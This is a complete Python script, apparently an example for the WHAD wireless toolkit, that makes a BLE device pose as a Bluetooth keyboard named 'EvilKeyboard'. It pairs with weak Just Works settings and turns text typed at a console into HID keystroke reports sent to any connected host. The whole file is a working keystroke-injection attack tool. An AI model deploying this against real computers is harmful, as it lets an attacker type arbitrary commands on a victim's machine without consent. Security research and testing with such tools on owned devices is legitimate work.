from whad.ble import Peripheral
from whad.ble.profile.advdata import AdvCompleteLocalName, \
                                     AdvDataFieldList, AdvFlagsField
from whad.ble.profile.attribute import UUID
from whad.ble.profile import PrimaryService, Characteristic, GenericProfile, \
    ReadAccess, WriteAccess, Authentication, Encryption, Authorization, ReportReferenceDescriptor
from whad.device import WhadDevice
from struct import pack, unpack
from whad.ble.stack.smp import Pairing
from whad.common.converters.hid import HIDConverter
import sys

# Define the HID over GATT profile
class HIDOverGATT(GenericProfile):

    service1 = PrimaryService(
        uuid=UUID.from_name("Generic Access"),
        device_name=Characteristic(
            uuid=UUID.from_name("Device Name"),
            permissions=['read', 'write'],
            value=bytes('EvilKeyboard', 'utf-8')
        ),
        manufacturer_name=Characteristic(
            uuid=UUID.from_name("Manufacturer Name String"),
            permissions=['read', 'write'],
            value=bytes('EvilKeyboard', 'utf-8')
        ),
        pnp_id=Characteristic(
            uuid=UUID.from_name("PnP ID"),
            permissions=['read', 'write'],
            value=bytes.fromhex("014700ffffffff")
        )
    )


    service2 = PrimaryService(
        uuid = UUID(0x180f),
        level = Characteristic(
            uuid = UUID(0x2A19),
            permissions = ['read'],
            notify = True,
            indicate = True,
            value=pack('B', 100),
            security= ReadAccess(Encryption | Authentication)
        )
    )

    service3 = PrimaryService(
        uuid = UUID.from_name("Human Interface Device"),
        report = Characteristic(
            uuid = UUID.from_name("Report"),
            permissions = ['read', 'write'],
            notify = True,
            indicate = True,
            value = bytes.fromhex("0000000000000000"),
            report_reference_descriptor = ReportReferenceDescriptor(
                permissions = ['read', 'write', 'notify']
            )
        ),
        report_map = Characteristic(
            uuid = UUID.from_name("Report Map"),
            permissions = ['read'],
            value = bytes.fromhex("05010906a1018501050719e029e7150025019508750181029501750881010507190029ff150025ff950675088100050819012905950575019102950175039101c0")
        ),
        hid_information = Characteristic(
            uuid = UUID.from_name("HID Information"),
            permissions = ['read'],
            value = bytes.fromhex("00010002")
        ),
        hid_control_point = Characteristic(
            uuid = UUID.from_name("HID Control Point"),
            permissions = ['write_without_response'],
            value = bytes.fromhex("00")
        ),
        protocol_mode = Characteristic(
            uuid = UUID.from_name("Protocol Mode"),
            permissions = ['write_without_response', 'read'],
            notify=True,
            indicate=True,
            value = bytes.fromhex("01")
        ),

    )



if len(sys.argv) >= 2:
    # Instantiate the HID over GATT profile
    hid_profile = HIDOverGATT()

    # Setup the pairing parameters
    pairing = Pairing(
    lesc=False,
    mitm=False,
    bonding=True,
    )
    # Initialize device & connector
    device = WhadDevice.create(sys.argv[1])
    periph = Peripheral(device, profile=hid_profile, pairing=pairing)
    try:
        # Configure peripheral mode & advertising
        periph.enable_peripheral_mode(adv_data=AdvDataFieldList(
            AdvCompleteLocalName(b'EvilKeyboard'),
            AdvFlagsField()
        ))

        # Main loop
        print("Ready to inject keystrokes !")
        while True:
            print("> ", end="")
            text = input()

            # Convert text into keystrokes
            for key in text:
                hid_code, modifiers = HIDConverter.get_hid_code_from_key(key.lower(), locale="us")
                hid_profile.service3.report.value = bytes.fromhex("00") + bytes([modifiers, hid_code])+ bytes.fromhex("0000000000")
                hid_profile.service3.report.value = bytes.fromhex("0000000000000000")

    except KeyboardInterrupt:
        periph.close()

else:
    print("Usage:", sys.argv[0], "<interface>")
